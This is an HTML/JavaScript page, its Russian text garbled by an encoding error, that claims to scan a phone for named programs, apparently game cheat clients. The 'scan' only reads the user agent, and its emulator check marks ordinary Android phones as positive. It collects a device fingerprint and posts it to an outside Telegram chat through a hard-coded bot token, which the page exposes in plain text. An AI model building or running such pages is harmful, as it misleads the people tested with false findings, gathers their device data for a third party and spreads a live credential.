<body>
    <div class="container">
        <h1>üîç –ü–æ–∏—Å–∫ —Å–æ—Ñ—Ç–∞ –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–µ</h1>
        <p>–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ü–µ–ª–µ–≤—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º</p>

        <button class="check-btn" onclick="checkForSoftware()">
            üîç –ò—Å–∫–∞—Ç—å —Å–æ—Ñ—Ç
        </button>

        <div class="section">
            <h3>üéØ –¶–µ–ª–µ–≤—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã:</h3>
            <div id="softList">
                <div class="soft-item">ApollonClient - <span>–ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>
                <div class="soft-item">Halycon - <span>–ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>
                <div class="soft-item">veriable/variable - <span>–ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>
                <div class="soft-item">soft v1.1.5-1.21.100 - <span>–ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>
            </div>
        </div>

        <div id="statusMessage" class="status"></div>
    </div>

    <script>
        // –¶–µ–ª–µ–≤—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –¥–ª—è –ø–æ–∏—Å–∫–∞
        const targetSoftware = [
            { name: 'ApollonClient', patterns: ['apollonclient', 'apollon'] },
            { name: 'Halycon', patterns: ['halycon'] },
            { name: 'veriable/variable', patterns: ['veriable', 'variable'] },
            { name: 'soft v1.1.5-1.21.100', patterns: ['soft v1.1.5', 'soft v1.2', 'soft v1.3', 'soft v1.4', 'soft v1.5'] }
        ];

        function checkForSoftware() {
            const button = document.querySelector('.check-btn');
            const statusMessage = document.getElementById('statusMessage');
            const softList = document.getElementById('softList');
            
            button.disabled = true;
            button.textContent = 'üîç –ò—â–µ–º —Å–æ—Ñ—Ç...';
            
            statusMessage.className = 'status checking';
            statusMessage.textContent = 'üîÑ –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ü–µ–ª–µ–≤–æ–≥–æ —Å–æ—Ñ—Ç–∞...';

            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å—é –≤–æ–∑–º–æ–∂–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            const deviceAnalysis = analyzeDevice();
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É
            let foundCount = 0;
            let report = '';

            targetSoftware.forEach(soft => {
                const found = checkSoftwarePresence(soft, deviceAnalysis);
                const softElement = Array.from(softList.children).find(el => 
                    el.textContent.includes(soft.name)
                );
                
                if (softElement) {
                    if (found.found) {
                        softElement.className = 'soft-item found';
                        softElement.innerHTML = `${soft.name} - <strong>üö® –û–ë–ù–ê–†–£–ñ–ï–ù–û</strong>`;
                        foundCount++;
                        report += `üö® ${soft.name}: ${found.evidence}\n`;
                    } else {
                        softElement.className = 'soft-item not-found';
                        softElement.innerHTML = `${soft.name} - ‚úÖ –ù–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ`;
                    }
                }
            });

            // –§–æ—Ä–º–∏—Ä—É–µ–º –∏—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á–µ—Ç
            const finalReport = createFinalReport(deviceAnalysis, foundCount, report);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            sendToTelegram(finalReport, foundCount);
        }

        function analyzeDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            
            return {
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceType: /mobile|android|iphone|ipad/.test(userAgent) ? 'üì± –¢–µ–ª–µ—Ñ–æ–Ω' : 'üíª –ö–æ–º–ø—å—é—Ç–µ—Ä',
                os: getOSInfo(),
                browser: getBrowserInfo(),
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                time: new Date().toLocaleString('ru-RU'),
                
                // –ê–Ω–∞–ª–∏–∑ User Agent –Ω–∞ —Å–ª–µ–¥—ã —Å–æ—Ñ—Ç–∞
                uaAnalysis: userAgent,
                hasUnusualPatterns: hasUnusualPatterns(userAgent),
                
                // –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏
                touchPoints: navigator.maxTouchPoints || 0,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown'
            };
        }

        function checkSoftwarePresence(software, analysis) {
            const evidence = [];
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º User Agent –Ω–∞ —Å–ª–µ–¥—ã –ø—Ä–æ–≥—Ä–∞–º–º
            software.patterns.forEach(pattern => {
                if (analysis.uaAnalysis.includes(pattern.toLowerCase())) {
                    evidence.push(`–°–ª–µ–¥—ã –≤ User Agent: "${pattern}"`);
                }
            });

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—ã—á–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã
            if (analysis.hasUnusualPatterns) {
                evidence.push('–û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –Ω–µ–æ–±—ã—á–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –≤ —Å–∏—Å—Ç–µ–º–µ');
            }

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —ç–º—É–ª—è—Ç–æ—Ä—ã/–Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            if (isEmulator(analysis)) {
                evidence.push('–í–æ–∑–º–æ–∂–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç–º—É–ª—è—Ç–æ—Ä–∞');
            }

            return {
                found: evidence.length > 0,
                evidence: evidence.join(', ')
            };
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            return 'Unknown';
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            return 'Other';
        }

        function hasUnusualPatterns(userAgent) {
            const unusualPatterns = [
                'emulator', ' simulator', 'x86_64', 'arm64', 'genymotion',
                'bluestacks', 'nox', 'ldplayer', 'memu'
            ];
            return unusualPatterns.some(pattern => userAgent.includes(pattern));
        }

        function isEmulator(analysis) {
            // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —ç–º—É–ª—è—Ç–æ—Ä
            return analysis.touchPoints > 5 || 
                   analysis.platform.includes('Linux') || 
                   analysis.userAgent.includes('x86_64');
        }

        function createFinalReport(analysis, foundCount, foundReport) {
            let report = `üì± DEEP SOFTWARE SCAN - PHONE

üéØ –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ü–û–ò–°–ö–ê –°–û–§–¢–ê:
–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –ø—Ä–æ–≥—Ä–∞–º–º: ${foundCount} –∏–∑ ${targetSoftware.length}

${foundCount > 0 ? 'üö® –û–ë–ù–ê–†–£–ñ–ï–ù–û:' : '‚úÖ –¶–µ–ª–µ–≤–æ–π —Å–æ—Ñ—Ç –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω'}
${foundReport || '–ù–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ'}

üìä –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –£–°–¢–†–û–ô–°–¢–í–ï:
${analysis.deviceType}
‚öôÔ∏è –û–°: ${analysis.os}
üåê –ë—Ä–∞—É–∑–µ—Ä: ${analysis.browser}
üìè –≠–∫—Ä–∞–Ω: ${analysis.screen}
üó£Ô∏è –Ø–∑—ã–∫: ${analysis.language}
üïê –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${analysis.timezone}
‚è∞ –í—Ä–µ–º—è: ${analysis.time}

üíª –¢–ï–•–ù–ò–ß–ï–°–ö–ò–ï –î–ê–ù–ù–´–ï:
üëÜ –¢–∞—á–ø–æ–∏–Ω—Ç—ã: ${analysis.touchPoints}
üíæ –ü–∞–º—è—Ç—å: ${analysis.memory} GB
üî¢ –Ø–¥—Ä–∞: ${analysis.cores}

üîç USER AGENT –ê–ù–ê–õ–ò–ó:
${analysis.userAgent}`;

            return report;
        }

        function sendToTelegram(report, foundCount) {
            const statusMessage = document.getElementById('statusMessage');
            const button = document.querySelector('.check-btn');

            statusMessage.textContent = 'üì° –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç...';

            const botToken = "7988229002:AAFDWOKxwMME94dsMe0voMFMjJrlewbzHnE";
            const chatId = "5825879689";

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: report
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    if (foundCount > 0) {
                        statusMessage.className = 'status found-alert';
                        statusMessage.textContent = `üö® –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ ${foundCount} –ø—Ä–æ–≥—Ä–∞–º–º! –ü—Ä–æ–≤–µ—Ä—å Telegram.`;
                    } else {
                        statusMessage.className = 'status success';
                        statusMessage.textContent = '‚úÖ –¶–µ–ª–µ–≤–æ–π —Å–æ—Ñ—Ç –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω. –û—Ç—á–µ—Ç –≤ Telegram.';
                    }
                    button.textContent = '‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞';
                }
            })
            .catch(error => {
                statusMessage.className = 'status error';
                statusMessage.textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏';
                button.textContent = 'üîç –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞';
                button.disabled = false;
            });
        }
    </script>
